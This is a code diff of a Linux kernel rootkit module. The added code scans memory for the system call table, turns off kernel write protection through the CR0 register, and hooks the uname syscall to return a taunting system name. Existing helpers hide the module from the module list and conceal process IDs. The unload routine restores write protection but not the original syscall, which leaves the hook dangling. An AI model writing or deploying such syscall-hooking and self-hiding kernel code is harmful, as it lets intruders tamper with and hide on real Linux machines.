@@ -15,6 +15,7 @@
  *
  * =====================================================================================
  */
+
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -32,68 +33,29 @@
 #include <linux/syscalls.h>
 #include <linux/unistd.h>
 #include <asm/syscall.h>
+#include <linux/utsname.h>
 
 MODULE_LICENSE("GPL");
+
+#define PROTECTED_FLAG 0x10000
 
 static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
 static char pid_list[10][32];
 static int last_proc = -1;
 static unsigned long **_sys_call_table = NULL;
+static int failed = 0;
+static asmlinkage long (*org_uname) (struct new_utsname *);
 
-static void hexdump(unsigned char* ptr, unsigned int length) {
-  unsigned int i;
-  for (i = 0; i < length; i++) {
-    if (!((i+1) % 16)) {
-      printk("%02x\n", *(ptr+i));
-    } else {
-      if (!((i+1)%4)) {
-        printk("%02x  ", *(ptr+i));
-      } else {
-        printk("%02x ", *(ptr+i));
-      }
-    }
-  }
-}
+asmlinkage long uname(struct new_utsname *name) {
+  org_uname(name);
+  strcpy(name->sysname, "All your base are belong to us");
+  return 0;
+} 
 
 static void find_sctable(void) {
-//  struct desc_ptr idtr;
-//  gate_desc *idt_table;
-//  gate_desc *system_call_gate;
-//  unsigned long _system_call_off;
-//  unsigned char *_system_call_ptr;
-//
-//  unsigned int i;
-//  unsigned char *off;
-//
-//  asm ("sidt %0" : "=m" (idtr));
-//  printk("+ IDT is at %08x\n", idtr.address);
-//  idt_table = (gate_desc*) idtr.address;
-//  system_call_gate = &idt_table[0x80];
-//
-//  _system_call_off = gate_offset(*system_call_gate);
-//  _system_call_ptr = (unsigned char *) _system_call_off;
-//  printk("+ system_call is at %08x\n", _system_call_off);
-//  printk("+ system_call is at %08x\n", _system_call_ptr);
-//  hexdump(_system_call_ptr, 128);
-//
-//  off = _system_call_ptr;
-//  for(i = 0; i < 128; i++) {
-//    if (off[i] == 0xff && off[i+1] == 0x14 && (off[i+2] == 0xc5 || off[i+2] == 0x85))
-//      _sys_call_table = *(sys_call_ptr_t **)(off + i + 3);
-//  }
-//
-//  if (_sys_call_table == NULL)
-//    printk("+ System call table was not found");
-//  else {
-//    printk("+ System call table was found at %08x\n", _sys_call_table);
-//    printk("+ sys_close taken from sys_call_table %08x\n", *(_sys_call_table ));
-//  }
-//
-//  printk(" done ");
-  unsigned long **sctable;
+  unsigned long **sctable = NULL;
   unsigned long ptr;
 
-  sctable = NULL;
   for ( ptr = PAGE_OFFSET;
       ptr < ULLONG_MAX;
       ptr += sizeof(void *)) {
@@ -105,12 +67,14 @@ static void find_sctable(void) {
       break;
     }
   }
-    printk("+ System call table was found at %08x\n", (unsigned long long)_sys_call_table);
+  if (_sys_call_table == NULL)
+    failed = 1;
 }
 
 static inline void memorize(void) {
   prev_entry = THIS_MODULE->list.prev;
   find_sctable();
+  org_uname = _sys_call_table[__NR_uname];
 }
 
 static inline void vanish(void) {
@@ -141,6 +105,18 @@ static inline void release(void) {
   module_put(THIS_MODULE);
 }
 
+static inline void clear_write_permission(void) {
+  unsigned long cr0;
+  __asm__("mov %%cr0, %0" : "=r" (cr0));
+  __asm__("mov %0, %%cr0" : : "r" (cr0 & ~PROTECTED_FLAG)); 
+}
+
+static inline void set_write_permission(void) {
+  unsigned long cr0;
+  __asm__("mov %%cr0, %0" : "=r" (cr0));
+  __asm__("mov %0, %%cr0" : : "r" (cr0 | PROTECTED_FLAG)); 
+}
+
 static inline void hide_proc(char* pid) {
   if (last_proc == 9)
     return;
@@ -150,11 +126,20 @@ static inline void hide_proc(char* pid) {
 // on module load
 static int __init load_module(void) {
   memorize(); 
+  if (failed)
+    return 0;
+
+  clear_write_permission();
+  _sys_call_table[__NR_uname] = uname;
   return 0;
 }
 
 // on module unload
 static void __exit cleanup(void) {
+  if (failed)
+    return;
+  
+  set_write_permission();
   return;
 }
 
